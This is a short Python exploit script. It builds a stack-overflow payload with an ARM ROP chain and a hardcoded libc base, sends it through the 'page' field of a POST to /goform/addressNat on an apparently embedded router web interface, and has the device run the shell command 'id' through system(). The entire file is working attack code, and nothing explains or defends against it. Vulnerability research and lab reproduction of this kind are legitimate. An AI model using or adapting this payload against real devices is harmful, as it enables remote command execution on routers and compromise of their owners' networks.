import socket
import os
from pwn import *

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

ip = '192.168.33.107'
port = 32770

r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

li('[+] connecting')
r.connect((ip, port))
li('[+] connect finish')

rn = b'\r\n'

libc_base = 0x3fd9c000
system_addr = 0x005a270 + libc_base
pop_r3_pc = 0x00018298 + libc_base
mov_r0_sp_blx_r3 = 0x00040cb8 + libc_base

p1 = b'a' * 244 + b'a' * 4 + p32(pop_r3_pc) + p32(system_addr) + p32(mov_r0_sp_blx_r3) + b'id'

p2 = b'page=' + p1

p3 = b"POST /goform/addressNat" + b" HTTP/1.1" + rn
p3 += b"Host: 192.168.0.1" + rn
p3 += b"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0" + rn
p3 += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + rn
p3 += b"Accept-Language: en-US,en;q=0.5" + rn
p3 += b"Accept-Encoding: gzip, deflate" + rn
p3 += b"Cookie: password=hum1qw" + rn
p3 += b"Connection: close" + rn
p3 += b"Upgrade-Insecure-Requests: 1" + rn
p3 += (b"Content-Length: %d" % len(p2)) +rn
p3 += b'Content-Type: application/x-www-form-urlencoded'+rn
p3 += rn
p3 += p2

li('[+] sendling payload')
r.send(p3)

response = r.recv(4096)
response = response.decode()
li(response)
